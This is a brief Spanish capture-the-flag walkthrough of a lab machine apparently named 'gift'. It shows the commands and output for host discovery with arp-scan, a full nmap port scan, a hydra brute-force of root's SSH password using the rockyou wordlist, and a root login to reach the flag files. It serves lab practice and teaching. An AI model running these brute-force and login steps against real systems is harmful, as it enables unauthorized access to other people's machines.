@@ -1,0 +1,55 @@
+Empezamos intentando averiguar la ip de la máquina víctima 
+
+ ❯ sudo arp-scan 192.168.1.0/24 
+
+192.168.1.42	 
+
+ 
+
+Continuamos analizando los puertos, en busca de puertos abiertos 
+
+ ❯ nmap -sC -sV -sS -A -p- 192.168.1.42 
+
+PORT   STATE SERVICE VERSION 
+
+22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0) 
+
+80/tcp open  http    nginx 
+
+  
+Vemos un puerto ssh y otro web abierto. Hacemos un curl para ver su contenido  
+
+❯ curl -L 192.168.1.42 
+
+Dont Overthink. Really, Its simple. 
+
+	<!-- Trust me --> 
+
+ 
+
+Analizamos con nikto, dirbuster y wfuzz para ver el contenido de la web, pero no da resultado. 
+
+
+Sólo queda intentar lanzar un ataque por fuerza bruta a el servicio ssh 
+
+❯ hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.42 ssh 
+
+ [22][ssh] host: 192.168.1.42   login: root   password: simple 
+
+Obtenemos las credenciales. 
+
+ 
+
+Ahora toca conectarse por ssh 
+
+❯ ssh root@192.168.1.42 
+
+root@192.168.1.42's password:  
+
+IM AN SSH SERVER 
+
+gift:~# ls 
+
+root.txt  user.txt 
+
+Con un cat obtendríamos las flags ;) 
